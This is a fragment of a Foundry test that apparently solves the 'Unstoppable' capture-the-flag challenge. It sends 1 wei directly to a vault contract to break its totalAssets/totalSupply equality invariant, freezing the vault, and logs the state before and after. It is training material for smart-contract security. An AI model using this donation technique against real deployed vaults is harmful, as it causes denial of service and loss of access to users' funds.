...
contract UnstoppableChallenge is Test {
    ...
    // Senior Tip: We do not need to burn our entire 10 DVT tokens. Just 1 wei of the asset
    // is mathematically sufficient to permanently break the strict equality invariant.
    uint256 exploitAmount = 1;

    console.log("[*] Prior state of Vault:");
    console.log(" - totalAssets():", vault.totalAssets());
    console.log(" - totalSupply():", vault.totalSupply());

    // Perform the direct transfer bypass (estamos bajo el prank de 'player' gracias al modificador)
    token.transfer(address(vault), exploitAmount);

    console.log("[+] Exploit executed. 1 wei transferred directly to vault.");
    console.log("[*] Current state of Vault:");
    console.log(" - totalAssets():", vault.totalAssets());
    console.log(" - totalSupply():", vault.totalSupply());
    
    console.log("[SUCCESS] Vault invariant broken. Handing over to _isSolved()...");    
    }
